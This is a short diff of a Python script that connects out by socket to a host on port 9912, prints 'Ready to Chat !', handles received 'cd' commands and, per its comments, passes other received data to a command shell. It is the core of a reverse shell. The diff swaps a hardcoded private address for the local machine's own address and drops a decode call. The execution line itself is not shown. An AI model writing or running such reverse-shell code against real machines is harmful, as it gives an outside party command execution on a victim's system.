@@ -6,7 +6,7 @@ import subprocess
 import os
 try:
 	soc=socket.socket()
-	soc.connect(('192.168.56.1',9912))
+	soc.connect((socket.gethostbyname(socket.gethostname()),9912))
 	print('Ready to Chat !')
 	cmd=''
 	while True:
@@ -17,7 +17,7 @@ try:
 			break
 		if data[:2]=='cd':
 			#if we have detected a cd command 
-			os.chdir(data[3:].decode())
+			os.chdir(data[3:])
 		#the conditional for other processes
 		if len(data.encode())>0:
 			#Opening the Command Line Shell
